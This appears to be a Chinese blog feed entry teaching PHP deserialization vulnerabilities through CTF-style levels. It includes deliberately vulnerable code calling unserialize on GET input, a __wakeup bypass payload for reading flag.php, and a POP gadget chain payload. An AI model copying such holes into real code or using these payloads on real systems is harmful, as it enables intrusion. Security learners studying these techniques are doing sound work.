class="keyword">new</span> funct();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;`字符串拼接`&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> start_gg());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;start_gg&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;Call&quot;:2:&#123;s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:2:&#123;s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PHP反序列化漏洞&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞&quot;&gt;&lt;/a&gt;PHP反序列化漏洞&lt;/h1&gt;&lt;h3 id=&quot;PHP序列化与反序列化意义&quot;&gt;&lt;a href=&quot;#PHP序列化与反序列化意义&quot; class=&quot;headerlink&quot; title=&quot;PHP序列化与反序列化意义&quot;&gt;&lt;/a&gt;PHP序列化与反序列化意义&lt;/h3&gt;&lt;p&gt;在开发的过程中常常遇到需要把&lt;strong&gt;对象&lt;/strong&gt;或者&lt;strong&gt;数组&lt;/strong&gt;进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;序列化&lt;/strong&gt;（串行化）：是将变量转换为可保存或传输的字符串的过程；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反序列化&lt;/strong&gt;（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。&lt;/p&gt;
&lt;p&gt;这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。&lt;/p&gt;
&lt;p&gt;常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 &lt;/p&gt;</summary>
    
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化入门</title>
    <link href="http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/</id>
    <published>2020-11-09T01:50:53.000Z</published>
    <updated>2020-11-09T01:51:47.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h3 id="PHP序列化与反序列化意义"><a href="#PHP序列化与反序列化意义" class="headerlink" title="PHP序列化与反序列化意义"></a>PHP序列化与反序列化意义</h3><p>在开发的过程中常常遇到需要把<strong>对象</strong>或者<strong>数组</strong>进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。</p><p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 </p><a id="more"></a><h3 id="PHP序列化与反序列化入门"><a href="#PHP序列化与反序列化入门" class="headerlink" title="PHP序列化与反序列化入门"></a>PHP序列化与反序列化入门</h3><p>首先定义了一个类，其中包含两个共有变量<code>name</code>和<code>pass</code>。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094910.png" alt="image-20201108162349456"></p><p>序列化成了一长串字符串。其中O代表对象，4代表长度，come表示对象的名字，2表示对象有两个成员。括号里面就是描述这些成员。s表示是字符串，4表示该字符串中有4个字符。先尝试输出<code>$name</code>和<code>pass</code></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094916.png" alt="image-20201108164117690"></p><p>我对php反序列化漏洞的理解就是：新建了一个对象，并修改其中的成员变量，利用对象中的函数执行我们想让其执行的命令。我认为可以将其理解为SQL注入，注入的参数由攻击者任意设计，但是其中的过滤函数我们没办法修改，这里的成员函数就类似于sql注入中的过滤函数，只能使劲的想办法绕过，或者在php反序列化中使劲的利用这些函数进行命令等执行。</p><p>例如想让<code>getInfo</code>输出一些其他的东西。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Rainbow&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Username: &#x27;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot; Password: &quot;</span> . <span class="keyword">$this</span>-&gt;pass;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$come1</span> = <span class="keyword">new</span> come();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$come1</span>-&gt;getInfo().<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;come&#x27;</span>])-&gt;getInfo();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$come1</span>-&gt;getInfo().<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094920.png" alt="image-20201108170225906"></p><p>可以看到，<code>Username</code>和<code>Password</code>的值已经变了，其实就是新建了一个对象，然后调用<code>come</code>对象里面的<code>getInfo</code>函数输出 。</p><p>上面只是一个public的案例，接下来再看看成员变量是private时候的情况。private修饰的成员变量在序列化时会产生一个从%00经过urldecode解码后的符号来显出他的特殊。说起来绕口，直接上图片：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094926.png" alt="image-20201108185458912"></p><p>显示不出来的，就是%00经过url解码后的符号。相应的protected修饰的成员变量序列化的情况如下：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094929.png" alt="image-20201108190839867"></p><p>protected使用的前缀为%00*%00 对成员变量进行修饰。</p><h3 id="PHP类的魔术方法"><a href="#PHP类的魔术方法" class="headerlink" title="PHP类的魔术方法"></a>PHP类的魔术方法</h3><p>魔术方法就是在序列化或者反序列化的时候，程序会”情不自禁”的去调用这些函数。常见的有下面5个</p><ul><li>__construct 当一个对象创建时被调用</li><li>__destruct 当一个对象销毁时被调用</li><li>__toString 当一个对象被当作一个字符串使用</li><li>__sleep 在对象被序列化之前运行</li><li>__wakeup 在对象被反序列化之后被调用</li><li>__call():当要调用的方法不存在或权限不足时自动调用</li><li>__invoke():当把一个类当作函数使用时自动调用</li></ul><p>拿网上最好的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">                  <span class="keyword">return</span> <span class="string">&#x27;qwe&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test</span>= <span class="keyword">new</span> Test(); <span class="comment">// 创建对象的时候运行 construct</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sTest</span>= serialize(<span class="variable">$test</span>); <span class="comment">// 序列化的时候先调用 sleep</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$usTest</span>= unserialize(<span class="variable">$sTest</span>); <span class="comment">// 反序列先调用__wakeup函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$string</span>= <span class="string">&#x27;hello class &#x27;</span> . <span class="variable">$test</span>;  <span class="comment">// 调用toString函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//整个结束调用destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="关卡一"><a href="#关卡一" class="headerlink" title="关卡一"></a>关卡一</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$KEY</span> = <span class="string">&quot;D0g3!!!&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (unserialize(<span class="variable">$str</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到如果反序列化<code>$_GET&#123;&#39;str&#39;]</code>之后的内容为<code>D0g3!!!</code>，那么就能成功。那就简单了，逆向考虑，<code>$str=serialize($KEY)</code>即可</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094936.png" alt="image-20201108203657455"></p><h4 id="关卡二"><a href="#关卡二" class="headerlink" title="关卡二"></a>关卡二</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>)</span><br><span class="line">                    show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">                <span class="keyword">else</span>      </span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">        show_source(<span class="string">&#x27;index.php&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$file</span>=base64_decode( <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">        <span class="keyword">echo</span> unserialize(<span class="variable">$file</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span>   &lt;!--key in flag.php--&gt;</span><br></pre></td></tr></table></figure><p>这里通过<code>$_GET[&#39;file&#39;]</code>获取然后base64解码，然后再执行反序列化。然后看下漏洞怎么利用，反序列化会首先调用<code>wakeup</code>函数，在这里，会直接把文件名直接给替换成<code>index.php</code>，然后才会show源码。既然不能改变<code>$file</code>的值，那么只有绕过这个函数了。</p><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;SoFun&quot;:1:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125;    这是正常构造的payload，但是这个payload会经过wakeup函数</span><br><span class="line"></span><br><span class="line">但是要想绕过wakeup，需要修改到下面这种形式</span><br><span class="line"></span><br><span class="line">O:5:&quot;SoFun&quot;:2:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125;    这里就能绕过wakeup函数，将成员函数的变量设置成比实际成员变量大，就能绕过</span><br></pre></td></tr></table></figure><p>绕过具体可以参考<a href="https://www.cnblogs.com/zy-king-karl/p/11436872.html">https://www.cnblogs.com/zy-king-karl/p/11436872.html</a></p><h4 id="关卡三"><a href="#关卡三" class="headerlink" title="关卡三"></a>关卡三</h4><p>来源：<a href="https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4">https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4</a></p><p>一串连环套的调用案例，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;`字符串拼接`&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那只有倒退了。要想获取flag，就要调用<code>get_flag</code>函数，要想调用<code>get_flag</code>函数，就需要掉i用<code>__toString</code>方法，而这个方法只在被当作字符串输出的时候才会被调用，有输出的就是<code>func</code>类里面的<code>invoke</code>函数，而<code>invoke</code>函数只有把类当作函数使用的时候才会被调用，然后又看到<code>funct</code>对象，而<code>call</code>只有调用方法不存在的情况下被调用，再看到<code>Call</code>，里面调用了一个不知道的函数，然后就追溯到<code>destruct</code>函数。构造payload：</p><p>在每个函数里面添加一个 construct初始化函数，并指向下一个函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 